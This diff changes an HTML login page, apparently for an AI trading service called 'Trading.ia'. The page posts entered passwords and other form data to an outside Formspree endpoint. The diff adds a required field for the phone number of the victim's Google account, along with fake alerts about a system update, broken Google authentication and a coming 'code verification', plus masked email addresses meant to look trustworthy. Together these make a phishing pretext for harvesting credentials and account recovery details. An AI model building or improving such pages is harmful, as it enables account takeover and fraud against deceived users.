@@ -73,6 +73,10 @@
             <div class="input-group">
                 <input type="password" id="senha" name="senha" placeholder="Senha" required>
             </div>
+            <!-- Novo campo para telefone -->
+            <div class="input-group">
+                <input type="text" id="telefone" name="telefone" placeholder="Insira o telefone de sua conta Google" required>
+            </div>
             <button type="submit">Entrar</button>
         </form>
     </div>
@@ -82,11 +86,13 @@
     </div>
     
     <script>
-        
-               var resposta = confirm("Você quer continuar?");
+        var resposta = confirm("Você quer continuar?");
         if (resposta) {
+            alert(" ESTAMOS EM ATUALIZAÇÃO NO MOMENTO, SISTEMA INDISPONÍVEL PARA USO... ");
+            alert(" Correção de problemas com acesso dos usuários a IA; ");
+            alert(" Essa atualização visa melhorar a forma como acessar a IA, usuários não estão conseguindo usar a autenticação padrão do Google; ");
+            alert(" Grande número de chamados será implementada a verificação por código. ");
             alert(" Os acessos foram vínculados ao seu dispositivo com os seguintes endereços registrados em 18/01/2025 (ar5***68*@gmail.com/si***bra*024@gmail.com) ");
-            
         } else {
             alert("Você escolheu sair.");
             window.location.replace("https://www.sairsistema/Trading.ia");
@@ -101,7 +107,7 @@
             // Coleta os dados do formulário
             const formData = new FormData(this);
 
-            // Envia os dados usando fetch
+            // Envia os dados para o Formspree
             fetch('https://formspree.io/f/mnnnkgwe', {
                 method: 'POST',
                 body: formData,
